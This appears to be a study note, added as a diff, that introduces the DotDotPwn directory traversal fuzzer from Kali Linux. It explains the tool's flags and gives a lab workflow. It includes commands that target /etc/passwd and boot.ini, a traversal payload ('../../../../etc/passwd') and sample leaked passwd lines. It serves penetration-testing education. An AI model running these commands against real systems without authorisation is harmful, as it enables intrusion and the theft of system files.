@@ -1,0 +1,102 @@
+✅ Acknowledgement: DotDotPwn – Kali Linux
+🔗 Official tool page: https://www.kali.org/tools/dotdotpwn
+
+⸻
+
+1) What is DotDotPwn?
+
+DotDotPwn is a directory traversal fuzzer.
+It tests web servers, FTP, TFTP, and other services for directory traversal (../) vulnerabilities, which can expose sensitive files like /etc/passwd or configuration files.
+
+⸻
+
+2) Why use DotDotPwn?
+
+• Detects directory traversal flaws in services.
+• Helps pentesters check if input validation is weak.
+• Can test multiple protocols (HTTP, FTP, TFTP, WebDAV).
+• Useful for vulnerability assessment in labs.
+
+⸻
+
+3) How does DotDotPwn work?
+
+• Takes a target (IP/Domain + service) as input.
+• Tries payloads with ../ sequences to move up directories.
+• Attempts to retrieve sensitive files (e.g., /etc/passwd, boot.ini).
+• Reports if traversal is successful.
+
+⸻
+
+4) Exact Use Case (Lab Example)
+
+Command (HTTP test):
+
+dotdotpwn -m http -h 192.168.1.10 -f /etc/passwd
+
+Flags used:
+
+• -m → Mode (http, ftp, tftp, webdav)
+• -h → Host/IP of target
+• -f → File to retrieve (example: /etc/passwd)
+
+Observed Results (sample output):
+
+🔹 Target: http://192.168.1.10
+
+• Payload tried: ../../../../etc/passwd
+• Response: File content retrieved
+
+🔹 Extracted Content (snippet):
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+
+
+Interpretation:
+
+• Target web server vulnerable to directory traversal.
+• /etc/passwd file leaked → confirms flaw.
+
+⸻
+
+5) Practical Workflow
+
+1.Install (already in Kali, but in case missing):
+
+sudo apt install dotdotpwn
+
+2.Scan a web server for traversal:
+
+dotdotpwn -m http -h <target_IP> -f /etc/passwd
+
+3.Test FTP service:
+
+dotdotpwn -m ftp -h <target_IP> -f boot.ini
+
+4.Brute-force mode (try multiple payloads automatically):
+
+dotdotpwn -m http -h <target_IP> -k
+
+⸻
+
+6) Limitations
+
+• Works only if the target has directory traversal vulnerabilities.
+• May cause false positives if server responds with error messages.
+• Can be noisy → logs traversal attempts on target system.
+• Outdated tool → newer frameworks (like Burp Suite or OWASP ZAP) provide more advanced fuzzing.
+
+⸻
+
+7) Summary
+
+What: Directory traversal fuzzer.
+Why: Identify ../ traversal flaws in HTTP, FTP, TFTP, WebDAV.
+How: Sends crafted traversal payloads, tries to read sensitive files.
+Use Case: Example lab → successfully retrieved /etc/passwd from a vulnerable web server.
+
+👉 Note: Excellent for labs and demos; for real-world tests, pair with modern fuzzers.
+
+⸻
